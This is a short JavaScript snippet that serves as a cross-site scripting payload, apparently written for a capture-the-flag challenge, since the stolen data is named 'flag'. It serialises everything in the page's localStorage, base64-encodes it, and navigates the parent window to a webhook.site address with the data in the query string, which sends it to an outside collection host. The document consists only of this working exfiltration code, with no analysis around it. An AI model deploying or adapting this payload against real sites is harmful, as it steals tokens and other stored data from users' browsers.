const flag = JSON.stringify({ ...localStorage })

window.parent.document.location = `https://webhook.site/a5388cab-66ea-40a0-ab45-8cf4c138115f?flag=${encodeURIComponent(btoa(flag))}`
